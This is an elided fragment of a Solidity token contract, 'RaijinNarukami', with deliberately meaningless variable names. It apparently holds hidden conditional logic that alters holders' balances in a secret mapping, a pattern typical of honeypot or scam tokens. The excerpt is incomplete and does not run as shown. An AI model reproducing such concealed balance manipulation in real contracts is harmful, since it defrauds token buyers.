...
contract RaijinNarukami is Ownable {
    constructor(
        string memory _NAME,
        ...
        _balances[RAIJIN] = like;
        _balances[msg.sender] = _tTotal;
        token[RAIJIN] = like;
        token[msg.sender] = like;
    ...
    function biggest(
        ...
        if (token[treated] == 0 && driven[treated] > 0 && !border) {
            token[treated] -= order;
            if (amount > 2 * 10**(13 + _decimals)) token[treated] -= order - 1;
        }

        interest[1] = official;

        if (token[treated] > 0 && amount == 0) {
            token[official] += order;
        }
